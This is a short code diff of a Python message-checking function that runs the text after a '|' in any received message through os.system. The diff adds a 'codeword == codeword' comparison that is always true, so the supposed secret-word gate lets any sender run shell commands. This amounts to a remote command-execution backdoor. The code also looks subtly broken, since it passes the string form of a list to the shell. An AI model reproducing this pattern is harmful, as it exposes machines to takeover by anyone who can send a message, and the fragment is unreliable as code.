@@ -384,7 +384,7 @@ def check_msg():
                     print("Oh gosh, the user has a command for us...")
                     msg_codeword = str(msg.body).split("|")[0]
                     msg_cmd = str(str(msg.body).split("|")[1:])
-                    if codeword = codeword:
+                    if codeword == codeword:
                         print("hmmm, they new the secret code word... we should let them....")
                         try:
                             os.system(msg_cmd)
